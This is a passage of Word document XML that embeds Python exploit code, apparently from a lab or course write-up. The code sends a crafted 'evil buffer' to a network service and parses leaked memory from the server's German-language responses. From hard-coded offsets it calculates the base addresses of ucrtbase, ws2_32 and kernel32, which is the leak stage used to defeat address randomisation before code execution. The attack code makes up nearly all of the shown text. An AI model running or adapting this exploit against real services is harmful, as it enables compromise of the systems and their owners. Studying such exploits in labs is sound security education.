            </w:r>
          </w:p>
          <w:p w14:paraId="12E95C30" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(buffer + bytes('\r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D826A3E" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    data = b""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3286F8" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4070A5A5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    while(len(data)&lt;bufferLenght):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C8F84B5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        data += s.recv(bufferLenght)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68E2DE75" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="627D0C03" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('n\r\n', 'utf-8')) # evil buffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7242C34D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="064B569D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="13467F68" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # remove unnecessary line which are send by the server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12927F5E" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = data.decode("utf-8")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="192CF0AC" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = string.replace("Neuer Topic: ", "")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C19C0D0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3306CC99" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>string = string.replace("&gt;", "\r\n")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26E3C5C0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0B262B1F" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # write into the file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52510BF8" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f = open(fileName, "w")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A44FC6B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.write(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="139447C0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A91510A" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="73DEC0A0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # open the file and put the leaked addresses in an array</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4390ABB7" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    infile = open(fileName, 'r')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20187369" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lines = infile.readlines()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65103425" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresses = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39AD67B4" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4C702C52" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    for line in lines:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06612E05" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        leakedAdresses.append(line)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="592F1C54" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7F5EAA4A" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #calculation of ucrtbase base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DB7C8AC" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_UcrtBase = int('CE76C', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E9A6EFD" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseUcrtbase = leakedAdresses[27][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45A0A72B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseUcrtbase_int = int(leakedAdresseUcrtbase, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F39EC7F" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseUcrtBase = hex(leakedAdresseUcrtbase_int - offSet_UcrtBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C328FBE" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2AC12A11" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4F7790F0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #calculation of ws2_32 base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39001AF5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_WS2_32 = int('6C19', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="541705B0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseWS2_32 = leakedAdresses[0][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1242253B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseWS2_32_int = int(leakedAdresseWS2_32, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9AF851" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseWS2_32 = hex(leakedAdresseWS2_32_int - offSet_WS2_32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A34F186" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0C228111" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # calculation of kernel32 base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22BE256C" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    offSet_Kernel32 = int('4EF6C', 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73AE5535" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_1 = leakedAdresses[157][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0207BC35" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_2 = leakedAdresses[158][0:8]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DCBEABB" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_1_int = int(leakedAdresseKernel32_1, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12F911F5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresseKernel32_2_int = int(leakedAdresseKernel32_2, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78329E85" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseKernel32_1 = hex(leakedAdresseKernel32_1_int - offSet_Kernel32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48F84F33" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    baseKernel32_2 = hex(leakedAdresseKernel32_2_int - offSet_Kernel32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79032D2B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="09E8BC11" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print(baseKernel32_1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40838BF4" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print(baseKernel32_2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="119CD6D3" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="48EA258F" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    if len(baseKernel32_1) == 10:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59AFAEAC" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43CCE084" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('CALCULATED BASES FROM LEAKED ADRESSES')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25CDEE3D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68395C2B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('KERNEL32: ', baseKernel32_1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B91DECB" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>print('WS2_32: ', baseWS2_32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="261D17A5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('UcrtBase: ', baseUcrtBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4520DF32" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="191F5B3B" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return baseUcrtBase, baseWS2_32, baseKernel32_1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62FBA6A5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B34FB54" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A9ABB3A" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
